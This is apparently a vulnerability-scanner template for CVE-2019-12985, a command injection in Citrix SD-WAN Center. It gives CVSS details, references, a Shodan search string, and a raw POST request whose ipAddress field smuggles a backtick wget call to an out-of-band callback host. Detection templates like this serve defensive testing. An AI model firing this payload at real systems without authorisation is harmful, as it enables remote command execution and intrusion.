id: CVE-2019-12985
info:
  name: Citrix SD-WAN Center - Unauthenticated Remote Command Injection
  author: gy741
  severity: critical
  description: Citrix SD-WAN Center is vulnerable to unauthenticated remote command
    injection through the ping action in DiagnosticsController which allows an attacker
    to execute shell commands by supplying crafted values for ipAddress, pingCount
    or packetSize.
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2019-12985
  - https://www.tenable.com/security/research/tra-2019-31
  - https://support.citrix.com/article/CTX251987
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2019-12985
    cwe-id: CWE-78
  metadata:
    shodan-query: http.title:"Citrix SD-WAN"
    impact: The impact of CVE-2019-12985 is that an unauthenticated remote attacker
      can execute arbitrary commands on the affected system through the ping action
      in DiagnosticsController, leading to potential data theft or disruption of services.
    recommendation: It is highly recommended to update Citrix SD-WAN Center immediately
      to address the vulnerability CVE-2019-12985 and mitigate the risk of remote
      command injection attacks.
  tags: cve,cve2019,citrix,rce,unauth,oast,tenable
requests:
- raw:
  - 'GET /login HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /Collector/diagnostics/ping HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    ipAddress=%60/bin/wget+http://{{interactsh-url}}%60

    '
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  - type: dsl
    dsl:
    - contains(body_1, "<title>Citrix SD-WAN</title>")
